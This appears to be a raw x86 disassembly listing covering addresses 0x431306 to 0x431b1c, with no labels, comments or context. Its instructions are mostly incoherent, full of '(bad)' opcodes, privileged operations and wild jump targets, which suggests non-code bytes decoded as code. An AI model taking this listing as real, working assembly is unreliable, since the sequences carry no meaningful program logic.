  431306:	xchg   esi,eax
  431307:	aam    0xcf
  431309:	out    dx,al
  43130a:	mov    DWORD PTR [esi-0x68],edi
  43130d:	inc    ebp
  43130e:	dec    edx
  43130f:	pop    ecx
  431310:	mov    edx,DWORD PTR [eax]
  431312:	repnz push bp
  431315:	or     BYTE PTR [ebx+0x55106638],0x49
  43131c:	(bad)  
  43131d:	repnz xor eax,0xa0898945
  431323:	mov    ah,0x89
  431325:	jmp    DWORD PTR [edx+0x66b0418d]
  43132b:	inc    DWORD PTR [ebp+0x50]
  43132e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431332:	mov    DWORD PTR [eax],ecx
  431334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431335:	pop    es
  431336:	inc    ecx
  431337:	(bad)  
  431338:	data16 fwait
  43133a:	inc    ebp
  43133b:	xor    ah,BYTE PTR [esi+0x3]
  43133e:	dec    ebp
  43133f:	push   eax
  431340:	inc    bp
  431342:	jge    0x4312c7
  431344:	mov    esp,DWORD PTR [esi-0x18]
  431347:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43134d:	add    DWORD PTR [ebx],esi
  43134f:	add    BYTE PTR [ebx],al
  431351:	test   DWORD PTR [ebx],esi
  431353:	(bad)  
  431354:	inc    WORD PTR [ebp+0x0]
  431358:	mov    eax,DWORD PTR [eax]
  43135a:	call   0x8898ca8f
  43135f:	mov    esi,eax
  431361:	clc    
  431362:	ret    
  431363:	rol    cl,0xa
  431366:	mov    DWORD PTR ds:0x7c0ec88,esi
  43136c:	mov    edx,edi
  43136e:	pushf  
  43136f:	pop    es
  431370:	jmp    FWORD PTR [edx+0x66]
  431373:	add    BYTE PTR [ebp-0x990175],al
  431379:	inc    ebp
  43137a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431380:	push   ebp
  431381:	mov    edi,eax
  431383:	mov    dh,BYTE PTR [eax+0x266ff51]
  431389:	push   ebp
  43138a:	add    BYTE PTR [ebx-0x764b0777],al
  431390:	dec    DWORD PTR [esi+0x661851e8]
  431396:	add    BYTE PTR [ebp-0x7b],dl
  431399:	cmp    esi,0xfffffffb
  43139c:	dec    DWORD PTR [ecx+0x51fe9285]
  4313a2:	jmp    DWORD PTR [esi-0x75]
  4313a5:	push   ebp
  4313a6:	hlt    
  4313a7:	data16 (bad) 
  4313a9:	dec    ebp
  4313aa:	ret    
  4313ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313b1:	lea    edx,[eax-0x1]
  4313b4:	jne    0x431387
  4313b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313bc:	dec    BYTE PTR [ecx+0x51559eff]
  4313c2:	mov    DWORD PTR [esi-0x4c],esp
  4313c5:	push   ebp
  4313c6:	jmp    DWORD PTR [esi-0x18]
  4313c9:	inc    ebp
  4313ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313d0:	(bad)  
  4313d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313d2:	inc    eax
  4313d4:	test   DWORD PTR [esi-0x2],esp
  4313d7:	inc    ebp
  4313d8:	dec    DWORD PTR [ebp-0x760bde75]
  4313de:	(bad)  
  4313df:	test   al,0xc3
  4313e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313e7:	lods   al,BYTE PTR ds:[esi]
  4313e8:	push   eax
  4313e9:	inc    ebp
  4313ea:	jne    0x4313fb
  4313ec:	dec    DWORD PTR [ebp+0x8]
  4313ef:	mov    ecx,DWORD PTR [ebx]
  4313f1:	sbb    al,0x0
  4313f3:	(bad)  
  4313f4:	mov    eax,0xc14fc3
  4313f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4313ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431403:	xor    eax,DWORD PTR [eax]
  431405:	add    eax,edi
  431407:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43140d:	xor    edi,DWORD PTR [eax+0x854f66]
  431413:	dec    BYTE PTR [ecx-0x76bb01]
  431419:	mov    BYTE PTR [ebx-0x76724001],al
  43141f:	pushf  
  431420:	inc    esi
  431421:	(bad)  
  431422:	dec    DWORD PTR [ebp-0x7abe6373]
  431428:	sar    esi,0x89
  43142b:	dec    DWORD PTR [eax+0x0]
  43142e:	inc    DWORD PTR [eax]
  431430:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431437:	xlat   BYTE PTR ds:[ebx]
  431438:	dec    edx
  431439:	add    bh,bh
  43143b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431441:	lea    esp,[esi-0x50]
  431444:	(bad)  
  431445:	(bad)  
  431446:	call   DWORD PTR [eax-0x1]
  431449:	inc    ebp
  43144a:	rdpmc  
  43144c:	add    BYTE PTR [ebx],al
  43144e:	push   ax
  431450:	lea    eax,[ebp-0x1]
  431456:	js     0x431457
  431458:	add    al,bh
  43145a:	push   bp
  43145c:	lea    ecx,[ebp-0x7701]
  431462:	fmul   DWORD PTR [ebp-0x7a997800]
  431468:	(bad)  
  431469:	(bad)  
  43146a:	(bad)  
  43146b:	(bad)  
  43146c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431472:	dec    eax
  431473:	mov    eax,0x8d8dffff
  431478:	mov    al,0xb0
  43147a:	(bad)  
  43147b:	call   DWORD PTR [ecx+0x50]
  43147e:	dec    ebp
  43147f:	inc    ebp
  431480:	mov    esi,0x7030833
  431485:	push   eax
  431486:	into   
  431487:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43148d:	call   DWORD PTR [ecx-0x8]
  431490:	lea    edx,[ebp-0x1]
  431493:	jmp    0x761697
  431498:	inc    eax
  431499:	jnp    0x431428
  43149b:	add    dh,bh
  43149d:	inc    WORD PTR [ebp-0x8a00b0]
  4314a4:	mov    edx,eax
  4314a6:	inc    esp
  4314a7:	add    bh,bh
  4314a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314af:	dec    DWORD PTR [ebx-0x7f820301]
  4314b5:	add    BYTE PTR [ecx],al
  4314b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4314be:	inc    eax
  4314c0:	(bad)  
  4314c1:	dec    si
  4314c3:	test   edi,edi
  4314c5:	(bad)  
  4314c6:	cmp    edi,edi
  4314c8:	add    ecx,DWORD PTR [edi-0x39]
  4314cb:	mov    edx,DWORD PTR [edx+0x66]
  4314ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4314d4:	mov    eax,0x66ff8b5e
  4314da:	jmp    0xb4ff:0xc7ff3895
  4314e1:	push   ecx
  4314e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314e8:	call   DWORD PTR [esi-0x1]
  4314eb:	dec    DWORD PTR [eax]
  4314ed:	mov    ecx,0x805ff
  4314f2:	inc    ebp
  4314f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4314f9:	mov    ecx,0x35784
  4314fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431504:	inc    ebp
  431505:	mov    ecx,0x9c6131
  43150a:	(bad)  
  43150b:	mov    eax,ebx
  43150d:	pop    esp
  43150e:	test   edi,edi
  431510:	clc    
  431511:	lea    eax,[ebp-0x24]
  431514:	cmp    eax,0xc7fe9c8d
  431519:	push   eax
  43151b:	lea    eax,[ebp+0x45fff8fe]
  431521:	mov    esi,DWORD PTR [ecx]
  431523:	hlt    
  431524:	lahf   
  431525:	push   esp
  431526:	mov    edx,DWORD PTR [ecx-0x4]
  431529:	xor    eax,DWORD PTR [eax+0x7201bb]
  43152f:	add    BYTE PTR [ebp-0x35],al
  431532:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431538:	mov    edx,DWORD PTR [ecx-0x74]
  43153b:	rol    BYTE PTR [eax],0x8d
  43153e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431542:	nop
  431543:	push   ecx
  431544:	add    bh,bh
  431546:	mov    esp,edi
  431548:	in     al,0x85
  43154a:	jge    0x43154a
  43154c:	test   edi,edi
  43154e:	jne    0x4314d5
  431550:	(bad)  
  431551:	(bad)  
  431552:	sbb    bh,bh
  431554:	push   ebp
  431555:	inc    ebp
  431556:	call   0xffdc0fe6
  43155b:	add    BYTE PTR [ebp+0x66],al
  43155e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431564:	cmp    al,0x85
  431566:	ud0    eax,DWORD PTR [ebp-0x1]
  43156a:	test   DWORD PTR [edi+0x74],ecx
  43156d:	dec    edi
  43156e:	inc    DWORD PTR [ebp-0x530004]
  431574:	dec    DWORD PTR [edi-0x75]
  431577:	dec    esi
  431578:	cld    
  431579:	test   DWORD PTR [eax+0xff01ff],eax
  43157f:	icebp  
  431580:	add    BYTE PTR [edi-0x3a],cl
  431583:	test   ebx,eax
  431585:	inc    BYTE PTR [ebp-0x1]
  431588:	jne    0x43158a
  43158a:	mov    eax,DWORD PTR [eax]
  43158c:	cld    
  43158d:	xor    BYTE PTR [ecx+0x500155],cl
  431593:	push   ebp
  431594:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43159a:	add    BYTE PTR [ebp+0x35e90f50],al
  4315a0:	add    al,BYTE PTR [eax]
  4315a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315a8:	add    ah,ch
  4315aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4315b0:	jmp    0xdf18a6
  4315b5:	(bad)  
  4315b6:	nop    ecx
  4315b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4315bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4315c2:	mov    eax,edi
  4315c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4315c7:	add    eax,0x45fef885
  4315cc:	dec    DWORD PTR [ebx+0x339445]
  4315d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315d8:	dec    DWORD PTR [ebx-0x460f0375]
  4315de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315df:	add    esi,edi
  4315e1:	add    bh,bh
  4315e3:	rdpmc  
  4315e5:	add    BYTE PTR [ebx],0x1
  4315e8:	mov    DWORD PTR [eax],eax
  4315ea:	add    al,0x45
  4315ec:	dec    DWORD PTR [ecx-0x360b3373]
  4315f2:	dec    DWORD PTR [esi]
  4315f4:	push   eax
  4315f5:	jne    0x43163c
  4315f7:	mov    esi,DWORD PTR [ebx]
  4315f9:	cld    
  4315fa:	add    esp,ecx
  4315fc:	push   eax
  4315fd:	inc    DWORD PTR [ebp-0x75]
  431600:	add    eax,0x800e4
  431605:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43160b:	mov    DWORD PTR [ecx],eax
  43160d:	sbb    al,0x0
  43160f:	leave  
  431610:	test   DWORD PTR [edi-0x2],eax
  431613:	jne    0x431614
  431615:	call   0xff44001a
  43161a:	xor    BYTE PTR [ebp+0x4d],al
  43161d:	mov    edi,edi
  43161f:	enter  0x8,0x4d
  431623:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431629:	mov    eax,DWORD PTR [eax]
  43162b:	cld    
  43162c:	add    DWORD PTR [ecx],ebx
  43162e:	inc    ebp
  43162f:	dec    ebp
  431630:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431636:	inc    eax
  431637:	dec    DWORD PTR [ecx-0x270375]
  43163d:	add    BYTE PTR [ebx-0x39d72701],cl
  431643:	xchg   ecx,eax
  431644:	ret    
  431645:	add    BYTE PTR [ebp-0x830075],al
  43164b:	add    BYTE PTR [ebp-0x75],al
  43164e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431654:	lea    edi,[edi-0xc]
  431657:	add    bh,bh
  431659:	mov    edx,DWORD PTR [eax-0x7b]
  43165c:	inc    ebp
  43165d:	rdpmc  
  43165f:	jne    0x431664
  431661:	add    BYTE PTR [eax-0x75],dl
  431664:	inc    ebp
  431665:	clc    
  431666:	add    eax,0x400009
  43166b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431671:	mov    eax,DWORD PTR [ecx]
  431673:	in     al,dx
  431674:	add    dh,al
  431676:	test   ebx,eax
  431678:	inc    BYTE PTR [ebp-0xff0001]
  43167e:	add    BYTE PTR [ebp-0x43],al
  431681:	cmp    esi,0xfffffff8
  431684:	(bad)  
  431685:	push   DWORD PTR [eax]
  431687:	add    BYTE PTR [ebp-0x3a],dl
  43168a:	test   ebx,eax
  43168c:	je     0x431613
  43168e:	mov    edi,edi
  431690:	sbb    al,0xff
  431692:	test   DWORD PTR gs:[eax],eax
  431695:	(bad)  
  431696:	js     0x431697
  431698:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43169e:	sub    eax,ebx
  4316a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316a6:	add    eax,DWORD PTR [eax]
  4316a8:	dec    ebp
  4316a9:	push   eax
  4316aa:	mov    al,BYTE PTR [ebp+0x1]
  4316ad:	mov    eax,DWORD PTR [ebp-0x68]
  4316b0:	mov    eax,DWORD PTR [eax]
  4316b2:	sbb    bh,al
  4316b4:	or     ah,dh
  4316b6:	dec    ebp
  4316b7:	inc    DWORD PTR [eax+0x4]
  4316ba:	push   ecx
  4316bb:	add    BYTE PTR [edx-0x1],dh
  4316be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316d4:	push   ecx
  4316d5:	cmp    BYTE PTR [ebx],al
  4316d7:	inc    ebp
  4316d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316de:	(bad)  
  4316df:	(bad)  
  4316e0:	in     al,0xff
  4316e2:	add    BYTE PTR [ebp+0x0],al
  4316e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316eb:	add    al,bh
  4316ed:	(bad)  
  4316ee:	jmp    0x8d85:0x74b0558d
  4316f5:	dec    DWORD PTR [eax]
  4316f7:	call   DWORD PTR [ebp-0x7b]
  4316fa:	mov    edi,esi
  4316fc:	lock call DWORD PTR [ebp-0x75]
  431700:	mov    esi,esp
  431702:	mov    ah,0xc6
  431704:	mov    bh,0xc3
  431706:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43170c:	add    DWORD PTR [eax],0x450050ff
  431712:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431718:	inc    edi
  43171a:	push   esp
  43171c:	jmp    0xcd00:0x650481ff
  431723:	mov    DWORD PTR [ebx],esi
  431725:	clc    
  431726:	cmp    edi,0xff9cff3c
  43172c:	jne    0x431736
  43172e:	mov    eax,eax
  431730:	add    esi,DWORD PTR [eax]
  431732:	int3   
  431733:	inc    ebp
  431734:	cmp    al,0x83
  431736:	add    BYTE PTR [eax],bl
  431738:	adc    DWORD PTR [ebx+0x768b5055],eax
  43173e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431744:	mov    edi,eax
  431746:	cmp    BYTE PTR [ebp+0x45],cl
  431749:	jmp    0x4316d6
  43174b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43174e:	inc    ebp
  43174f:	or     al,0x2
  431751:	dec    DWORD PTR [ebp+0x18]
  431754:	jne    0x4317ab
  431756:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43175c:	mov    edi,DWORD PTR [ebx]
  43175e:	in     al,0x50
  431760:	xchg   ecx,eax
  431761:	jmp    0x3436666
  431766:	adc    al,0x8b
  431768:	inc    ebp
  431769:	mov    al,ds:0x8b04008b
  43176e:	push   ebp
  43176f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431775:	push   ebp
  431776:	test   DWORD PTR [ebx-0x2800d701],ecx
  43177c:	inc    ebp
  43177d:	dec    ebp
  43177e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431784:	mov    DWORD PTR [eax],0xe9ff00f4
  43178a:	add    al,0x0
  43178c:	add    BYTE PTR [eax],al
  43178e:	mov    eax,edx
  431790:	push   eax
  431791:	rol    DWORD PTR [ebp-0xf0177],1
  431797:	bound  eax,QWORD PTR [ebp+0x50]
  43179a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317a6:	mov    al,0xf
  4317a8:	test   DWORD PTR [edx],edx
  4317aa:	call   DWORD PTR [ebp-0x7a0001]
  4317b0:	(bad)  
  4317b1:	loop   0x4317b2
  4317b3:	jnp    0xc6990bb9
  4317b9:	mov    eax,ebx
  4317bb:	cmp    al,0x8b
  4317bd:	(bad)  
  4317be:	cld    
  4317bf:	shr    esi,0xc
  4317c2:	add    dl,al
  4317c4:	push   eax
  4317c5:	lea    eax,[ebp-0x1]
  4317c8:	mov    edx,esi
  4317ca:	cwde   
  4317cb:	cli    
  4317cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317d2:	or     BYTE PTR [eax],cl
  4317d4:	inc    ebp
  4317d5:	dec    ebp
  4317d6:	inc    DWORD PTR [ebx+0x74803914]
  4317dc:	add    DWORD PTR [ebx+0x451800],ecx
  4317e2:	call   DWORD PTR [eax+edx*1]
  4317e5:	add    ecx,DWORD PTR [ebp-0x34]
  4317e8:	push   edi
  4317e9:	adc    al,0x8
  4317eb:	mov    edx,DWORD PTR [ebp-0x14]
  4317ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4317f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317f5:	inc    DWORD PTR [eax+esi*8]
  4317f8:	inc    ebp
  4317f9:	stos   BYTE PTR es:[edi],al
  4317fa:	mov    edx,DWORD PTR [ebp-0x4]
  4317fd:	add    DWORD PTR [ebp-0x1c],eax
  431800:	mov    edx,DWORD PTR [ebp-0x70]
  431803:	cmp    eax,DWORD PTR [eax]
  431805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431806:	mov    eax,DWORD PTR [eax]
  431808:	cld    
  431809:	jae    0x43178b
  43180b:	add    eax,DWORD PTR [ecx]
  43180d:	clc    
  43180e:	add    BYTE PTR [eax+0x30],dl
  431811:	mov    DWORD PTR [ecx],esi
  431813:	clc    
  431814:	pop    ds
  431815:	inc    ebp
  431816:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43181c:	(bad)  
  43181d:	push   DWORD PTR [edi]
  43181f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431825:	(bad)  
  431826:	jae    0x431827
  431828:	mov    eax,DWORD PTR [ebp-0x740175]
  43182e:	sub    eax,DWORD PTR [eax]
  431830:	add    eax,DWORD PTR [eax]
  431832:	mov    DWORD PTR [ecx+0x5f],eax
  431835:	mov    DWORD PTR [ebx-0x4],ebx
  431838:	ret    0xff
  43183b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431841:	ret    
  431842:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431848:	add    BYTE PTR [ebp-0x7d],al
  43184b:	mov    DWORD PTR [eax],eax
  43184d:	add    al,0x84
  43184f:	inc    DWORD PTR [ecx]
  431851:	lea    eax,[eax]
  431853:	hlt    
  431854:	sar    bh,cl
  431856:	test   BYTE PTR [eax+0x1],dl
  431859:	inc    ebp
  43185a:	add    BYTE PTR [ebx],dh
  43185c:	test   BYTE PTR [ebx],0x84
  43185f:	push   eax
  431860:	add    BYTE PTR [ebp+0x0],al
  431863:	add    eax,0x86
  431868:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43186e:	add    BYTE PTR [ecx],al
  431870:	add    BYTE PTR [eax],al
  431872:	mov    esi,0x550030
  431877:	mov    ecx,DWORD PTR [edi]
  431879:	cld    
  43187a:	fidiv  DWORD PTR [ebp+0x0]
  43187d:	mov    edi,DWORD PTR [ecx]
  43187f:	xor    BYTE PTR [eax+eax*1],0x84
  431883:	add    eax,DWORD PTR [eax]
  431885:	sbb    BYTE PTR [eax],al
  431887:	jne    0x43183a
  431889:	mov    eax,DWORD PTR [ecx]
  43188b:	sbb    BYTE PTR [eax],al
  43188d:	mov    DWORD PTR [ebp-0x1],esp
  431890:	add    BYTE PTR [eax+0x30e45ca],bh
  431896:	ret    0xb7fc
  431899:	dec    ebp
  43189a:	or     al,0x89
  43189c:	dec    ebp
  43189d:	cld    
  43189e:	cmovne ecx,DWORD PTR [eax-0x75]
  4318a2:	add    edi,esp
  4318a4:	seto   BYTE PTR [esi-0x72ffffff]
  4318ab:	inc    ebp
  4318ac:	adc    al,0x8b
  4318ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318b5:	cmp    DWORD PTR [edi+0x72],edx
  4318b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318be:	gs cmp al,0x0
  4318c1:	je     0x431899
  4318c3:	push   eax
  4318c4:	sar    BYTE PTR [eax],1
  4318c6:	mov    bh,0x3e
  4318c8:	push   cs
  4318c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318cf:	add    DWORD PTR [ecx+0x12],ebp
  4318d2:	dec    edx
  4318d3:	(bad)  
  4318d4:	mov    eax,edx
  4318d6:	in     al,dx
  4318d7:	adc    DWORD PTR [ecx],esi
  4318d9:	pop    esi
  4318da:	inc    ecx
  4318db:	leave  
  4318dc:	or     DWORD PTR [eax],ebx
  4318de:	gs push ebp
  4318e0:	add    ah,ch
  4318e2:	into   
  4318e3:	in     al,dx
  4318e4:	enter  0xb756,0xf0
  4318e8:	push   cs
  4318e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318f9:	jnp    0x74439e01
  4318ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431905:	add    BYTE PTR [edi],cl
  431907:	mov    edi,DWORD PTR [ecx-0x78]
  43190a:	ltr    WORD PTR [ecx-0x7b]
  43190e:	dec    DWORD PTR [edi]
  431910:	clc    
  431911:	out    0x45,eax
  431913:	add    BYTE PTR [eax],cl
  431915:	cmp    ebx,0xffffff8c
  431918:	jge    0x43191a
  43191a:	jb     0x43192c
  43191c:	je     0x52199c
  431922:	pop    edx
  431923:	push   esi
  431924:	mov    ecx,DWORD PTR [edi]
  431926:	in     al,dx
  431927:	rol    DWORD PTR [ebp+0x0],1
  43192a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431931:	cmp    DWORD PTR [ecx],0xfffffff0
  431934:	hlt    
  431935:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43193b:	(bad)  
  43193d:	push   eax
  43193e:	jns    0xb842fdbc
  431944:	lock push cs
  431946:	ror    edx,0x3
  431949:	test   BYTE PTR [ecx+0x5500e800],cl
  43194f:	dec    eax
  431950:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431954:	(bad)  
  431955:	mov    esi,0x7f33ff5f
  43195a:	inc    eax
  43195b:	test   DWORD PTR [edx],eax
  43195d:	je     0x43191f
  43195f:	mov    ecx,ecx
  431961:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431965:	and    eax,DWORD PTR [eax+0xf0103]
  43196b:	jp     0x431959
  43196d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431971:	add    edx,DWORD PTR [edi+0x74]
  431974:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43197a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431980:	je     0x431905
  431982:	cmp    eax,edi
  431984:	js     0x4319a9
  431986:	add    eax,0xeb0fc003
  43198b:	jns    0x431918
  43198d:	vmread DWORD PTR [ecx+0x45],ebx
  431991:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431997:	adc    al,0x8b
  431999:	jge    0x4319af
  43199b:	mov    edi,DWORD PTR [eax-0x4]
  43199e:	add    edi,DWORD PTR [edi]
  4319a0:	or     bh,bh
  4319a2:	push   ebp
  4319a3:	push   es
  4319a4:	mov    DWORD PTR [ebp-0x4],ebx
  4319a7:	add    edi,esi
  4319a9:	pop    es
  4319aa:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319b0:	mov    DWORD PTR [esp+esi*8],ecx
  4319b3:	inc    ebp
  4319b4:	pop    ebp
  4319b5:	xor    DWORD PTR [esi-0x4],0x3b
  4319b9:	add    edx,DWORD PTR [ecx+edi*1]
  4319bc:	push   es
  4319bd:	clc    
  4319be:	mov    bh,0xdb
  4319c0:	jp     0x431979
  4319c2:	add    cl,BYTE PTR [esi]
  4319c4:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319ca:	test   edi,edi
  4319cc:	je     0x4319c2
  4319ce:	mov    eax,ecx
  4319d0:	or     BYTE PTR [ebx],al
  4319d2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319d8:	jbe    0x431a4c
  4319da:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319e0:	add    ecx,DWORD PTR [esi]
  4319e2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319e8:	add    eax,DWORD PTR [ebx-0x287af783]
  4319ee:	je     0x431a3d
  4319f0:	mov    DWORD PTR [ecx],edi
  4319f2:	mov    esi,eax
  4319f4:	hlt    
  4319f5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319fc:	jb     0x4319be
  4319fe:	jmp    0x4319eb
  431a00:	xor    esi,DWORD PTR [ebx]
  431a02:	pop    edi
  431a03:	pop    esi
  431a04:	pop    ebx
  431a05:	ret    
  431a06:	ret    0x8b
  431a09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a0f:	xor    DWORD PTR [ecx],0xc
  431a12:	pushf  
  431a13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a19:	rdmsr  
  431a1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a22:	dec    ebp
  431a23:	ret    
  431a24:	mov    edi,DWORD PTR [esi-0x4]
  431a27:	pop    eax
  431a28:	dec    ebp
  431a29:	jne    0x4319b6
  431a2b:	xor    edi,esp
  431a2d:	inc    eax
  431a2e:	dec    ebp
  431a2f:	jbe    0x431a84
  431a31:	inc    eax
  431a32:	pop    ebp
  431a33:	add    edx,DWORD PTR [esi+0x8]
  431a36:	push   esp
  431a37:	dec    eax
  431a38:	push   ecx
  431a39:	mov    eax,edi
  431a3b:	and    al,0xf0
  431a3d:	jo     0x431a2a
  431a3f:	mov    eax,DWORD PTR [ebx]
  431a41:	sbb    BYTE PTR [ebp+0x4d],cl
  431a44:	mov    eax,DWORD PTR [ebx]
  431a46:	nop
  431a47:	or     BYTE PTR [eax],al
  431a49:	jne    0x431aa2
  431a4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a51:	cld    
  431a52:	xor    edi,edi
  431a54:	add    edi,DWORD PTR [ebp+0x3]
  431a57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a5d:	js     0x4319e3
  431a5f:	jae    0x431a63
  431a61:	(bad)  
  431a63:	xor    al,0x5d
  431a65:	jmp    0x4319f2
  431a67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a6e:	fdecstp 
  431a70:	test   BYTE PTR [edi],ah
  431a72:	add    bh,BYTE PTR [ebp+0x0]
  431a75:	add    ebx,DWORD PTR [ebp-0x77]
  431a78:	mov    edi,eax
  431a7a:	cmp    al,0x0
  431a7d:	adc    dh,BYTE PTR [ebx]
  431a7f:	jge    0x431a84
  431a81:	mov    edi,DWORD PTR [ebx]
  431a83:	jl     0x431a94
  431a85:	clc    
  431a86:	dec    edi
  431a87:	jge    0x431a89
  431a89:	mov    eax,DWORD PTR [ebx]
  431a8b:	jb     0x431a95
  431a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431a90:	mov    edi,edi
  431a92:	xor    edx,DWORD PTR [eax]
  431a94:	add    edi,DWORD PTR [ebx]
  431a96:	mov    DWORD PTR [ebp-0x10],edi
  431a99:	inc    edi
  431a9a:	pop    ebp
  431a9b:	jge    0x431ad8
  431a9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431aa1:	mov    edx,0xc05d87f0
  431aa6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aaa:	fimul  WORD PTR [eax]
  431aac:	fist   WORD PTR [ebp+0x1c]
  431aaf:	in     al,dx
  431ab0:	jne    0x431a9e
  431ab2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431ab8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431abc:	fdivp  st(0),st
  431abe:	fild   WORD PTR [ebp+0x4510f85c]
  431ac4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431aca:	inc    ebp
  431acb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ad1:	mov    ebp,DWORD PTR [ebx-0x4]
  431ad4:	adc    al,0x8b
  431ad6:	rcl    DWORD PTR [eax],0x48
  431ad9:	mov    esi,0x7080803
  431ade:	fiadd  WORD PTR [ebp+0x4d]
  431ae1:	(bad)  
  431ae2:	mov    edx,DWORD PTR [edx-0x4]
  431ae5:	mov    edx,DWORD PTR [ebp-0x4]
  431ae8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431aee:	mov    DWORD PTR [edi+0x872dc],edi
  431af4:	xlat   BYTE PTR ds:[ebx]
  431af5:	into   
  431af6:	ffreep st(6)
  431af8:	retf   0x6c7
  431afb:	iret   
  431afc:	dec    ebp
  431afd:	inc    ebp
  431afe:	mov    DWORD PTR [ebx],edi
  431b00:	fmul   QWORD PTR [edi]
  431b02:	dec    ebp
  431b03:	jnp    0x431b38
  431b05:	add    BYTE PTR [ebx],al
  431b07:	mov    ecx,DWORD PTR [esp+edi*8]
  431b0a:	inc    ebp
  431b0b:	dec    ebp
  431b0c:	lea    esi,[ebx]
  431b0e:	add    DWORD PTR [ebx],eax
  431b10:	jb     0x431b4d
  431b12:	add    BYTE PTR [edi],cl
  431b14:	inc    ebp
  431b15:	imul   eax,edi,0x858bd800
  431b1b:	cld    
  431b1c:	clc    
